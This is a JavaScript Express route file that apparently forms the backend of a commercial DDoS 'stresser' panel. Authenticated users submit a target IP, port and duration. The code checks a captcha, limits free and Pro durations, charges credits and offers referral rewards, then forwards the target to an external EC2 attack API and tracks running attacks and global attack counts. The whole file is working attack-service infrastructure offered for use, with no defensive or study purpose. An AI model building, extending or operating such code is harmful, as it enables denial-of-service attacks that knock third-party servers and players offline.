const express = require('express');
const router = express.Router();
const auth = require('../middleware/authMiddleware');
const User = require('../models/User');
const axios = require('axios');
const Stats = require('../models/Stats');
const bgmiService = require('../services/bgmiService');
require('dotenv').config();

// ── In-memory attack tracker ──────────────────────────────────────────────────
const activeAttacks = new Map();

// ── Blocked ports ─────────────────────────────────────────────────────────────
const BLOCKED_PORTS = new Set([8700, 20000, 443, 17500, 9031, 20002, 20001]);

// ── Captcha blacklist ─────────────────────────────────────────────────────────
const usedCaptchaTokens = new Map();

function blacklistToken(token) {
    usedCaptchaTokens.set(token, Date.now() + 310_000);
    for (const [t, exp] of usedCaptchaTokens) {
        if (Date.now() > exp) usedCaptchaTokens.delete(t);
    }
}

function isTokenBlacklisted(token) {
    const exp = usedCaptchaTokens.get(token);
    if (!exp) return false;
    if (Date.now() > exp) { usedCaptchaTokens.delete(token); return false; }
    return true;
}

async function verifyTurnstile(token, ip) {
    if (!token || token.length < 10) return { success: false };
    if (isTokenBlacklisted(token)) return { success: false, 'error-codes': ['duplicate-use'] };
    try {
        const params = new URLSearchParams({
            secret: process.env.TURNSTILE_SECRET,
            response: token,
        });
        if (ip && ip !== '::1' && !ip.startsWith('::ffff:127')) {
            params.append('remoteip', ip);
        }
        const { data } = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            params,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        if (data.success) blacklistToken(token);
        return data;
    } catch {
        return { success: false };
    }
}

// ─── GET /api/panel/me ────────────────────────────────────────────────────────
router.get('/me', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json(user);
    } catch {
        res.status(500).json({ message: 'Server error' });
    }
});

// ─── GET /api/panel/attack-status ────────────────────────────────────────────
// Returns only what the frontend needs — NO server URLs exposed
router.get('/attack-status', auth, async (req, res) => {
    try {
        const attackInfo = activeAttacks.get(req.user.id.toString());

        if (!attackInfo) {
            return res.json({ success: true, data: { status: 'idle' } });
        }

        // Check if duration has elapsed
        const elapsed = Date.now() - new Date(attackInfo.startedAt).getTime();
        if (elapsed >= attackInfo.duration * 1000) {
            activeAttacks.delete(req.user.id.toString());
            return res.json({ success: true, data: { status: 'completed' } });
        }

        // ✅ Only return what the frontend needs — no bgmiServer URL
        return res.json({
            success: true,
            data: {
                status: 'running',
                ip: attackInfo.ip,
                port: attackInfo.port,
                duration: attackInfo.duration,
                startedAt: attackInfo.startedAt
            }
        });
    } catch (err) {
        console.error('Attack status error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

router.get('/stats', async (req, res) => {
  try {
    const stats = await Stats.findById('global');
    res.json({
      totalAttacks: stats?.totalAttacks || 0,
      totalUsers:   stats?.totalUsers   || 0,
    });
  } catch {
    res.status(500).json({ message: 'Server error' });
  }
});

// ─── POST /api/panel/attack ───────────────────────────────────────────────────
router.post('/attack', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });

        const { ip, port, duration, captchaToken } = req.body;

        // Required fields
        if (!ip || !port || !duration) {
            return res.status(400).json({ message: 'IP, port, and duration are required' });
        }


        const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
        const captchaResult = await verifyTurnstile(captchaToken, clientIp);
        if (!captchaResult.success) {
            return res.status(403).json({
                message: 'Captcha verification failed. Please try again.',
                errors: captchaResult['error-codes']
            });
        }

        // IP validation
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ip)) {
            return res.status(400).json({ message: 'Invalid IP address format' });
        }

        // Port validation
        const portNum = parseInt(port);
        if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
            return res.status(400).json({ message: 'Port must be between 1 and 65535' });
        }

        // Blocked ports
        if (BLOCKED_PORTS.has(portNum)) {
            return res.status(400).json({
                message: `Port ${portNum} is blocked and cannot be used.`
            });
        }

        // Duration validation
        const durNum = parseInt(duration);
        const MAX_DURATION = user.isPro ? 300 : 60;

        if (isNaN(durNum) || durNum < 1) {
            return res.status(400).json({ message: 'Duration must be at least 1 second' });
        }

        if (durNum > MAX_DURATION) {
            return res.status(403).json({
                message: user.isPro
                    ? 'Duration cannot exceed 300 seconds'
                    : 'Free accounts are limited to 60 seconds. Upgrade to Pro for up to 300 seconds.',
                maxDuration: MAX_DURATION,
                isPro: user.isPro,
            });
        }

        // Credit check
        if (user.credits < 1) {
            return res.status(403).json({
                message: 'Insufficient credits. Share your referral link to earn more.',
                credits: user.credits,
            });
        }

        // Concurrent attack check
        if (activeAttacks.has(user._id.toString())) {
            return res.status(400).json({
                message: 'You already have an attack running. Please stop it first.'
            });
        }

        // 🔥 CALL YOUR EC2 API
        const apiStartTime = Date.now();
        
        console.log('[DEBUG] 🚀 Starting external API call...', {
            timestamp: new Date().toISOString(),
            userId: user._id,
            username: user.username,
            targetIp: ip,
            targetPort: portNum,
            duration: durNum,
            apiUrl: process.env.API_URL,
            clientIp: clientIp
        });

        const response = await axios.post(
            process.env.API_URL,
            {
                param1: ip,
                param2: portNum,
                param3: durNum
            },
            {
                headers: {
                    "Content-Type": "application/json",
                    "x-api-key": process.env.API_KEY
                },
                timeout: 15000,
                validateStatus: () => true
            }
        );

        const apiResponseTime = Date.now() - apiStartTime;

        // Log FULL external API response (for debugging only - NOT sent to frontend)
        console.log('[EXTERNAL API RESPONSE] ✅ Response received', {
            timestamp: new Date().toISOString(),
            userId: user._id,
            username: user.username,
            status: response.status,
            statusText: response.statusText,
            responseTimeMs: apiResponseTime,
            headers: response.headers,
            data: response.data,
            config: {
                url: response.config?.url,
                method: response.config?.method,
                timeout: response.config?.timeout
            }
        });

        // If external API failed
        if (response.status !== 200 || response.data?.error) {

            console.error('[ERROR] ❌ External API failed', {
                timestamp: new Date().toISOString(),
                userId: user._id,
                username: user.username,
                targetIp: ip,
                targetPort: portNum,
                status: response.status,
                statusText: response.statusText,
                errorMessage: response.data?.error,
                errorCode: response.data?.code,
                fullResponse: response.data,
                responseTimeMs: apiResponseTime
            });

            if (response.data?.error?.includes("Max concurrent")) {
                console.warn('[WARN] ⚠️  Max concurrent attacks reached', {
                    timestamp: new Date().toISOString(),
                    userId: user._id,
                    username: user.username,
                    currentAttacks: activeAttacks.size
                });
                return res.status(429).json({
                    message: "Server is busy. Too many attacks running. Please wait 5 seconds and try again.",
                    cooldown: 5
                });
            }

            return res.status(response.status || 400).json({
                message: response.data?.error || "Failed to start attack"
                // ✅ NOT sending external response details to frontend
            });
        }

        console.log('[SUCCESS] ✅ External API accepted attack', {
            timestamp: new Date().toISOString(),
            userId: user._id,
            username: user.username,
            targetIp: ip,
            targetPort: portNum,
            duration: durNum,
            status: response.status,
            responseTimeMs: apiResponseTime,
            responseData: response.data
        });

        // Register attack
        const startedAt = new Date().toISOString();

        activeAttacks.set(user._id.toString(), {
            ip,
            port: portNum,
            duration: durNum,
            startedAt
        });

        console.log('[INFO] 📝 Attack registered in memory', {
            timestamp: new Date().toISOString(),
            userId: user._id,
            username: user.username,
            totalActiveAttacks: activeAttacks.size,
            startedAt: startedAt
        });

        // Auto clear
        setTimeout(() => {
            activeAttacks.delete(user._id.toString());
            console.log('[INFO] 🗑️  Attack auto-cleared from memory', {
                timestamp: new Date().toISOString(),
                userId: user._id,
                username: user.username,
                totalActiveAttacks: activeAttacks.size
            });
        }, durNum * 1000 + 5000);

        // Deduct credit
        const updated = await User.findByIdAndUpdate(
            user._id,
            { $inc: { credits: -1 } },
            { new: true }
        );

        console.log('[INFO] 💳 Credit deducted', {
            timestamp: new Date().toISOString(),
            userId: user._id,
            username: user.username,
            creditsRemaining: updated.credits,
            creditDeducted: 1
        });

        await Stats.findByIdAndUpdate(
            'global',
            { $inc: { totalAttacks: 1 } },
            { upsert: true }
        );

        console.log('[SUCCESS] 🎯 Attack launched by ' + user.username + ' → ' + ip + ':' + portNum + ' for ' + durNum + 's');

        return res.json({
            message: 'Attack launched successfully',
            attack: {
                ip,
                port: portNum,
                duration: durNum,
                startedAt
                // ✅ Removed externalResponse to keep frontend clean
            },
            credits: updated.credits,
            isPro: user.isPro,
        });

    } catch (err) {
        console.error('[ERROR] 💥 Unexpected error in attack route', {
            timestamp: new Date().toISOString(),
            error: err.message,
            stack: err.stack,
            userId: req.user?.id,
            ip: req.body?.ip,
            port: req.body?.port
        });
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

module.exports = router;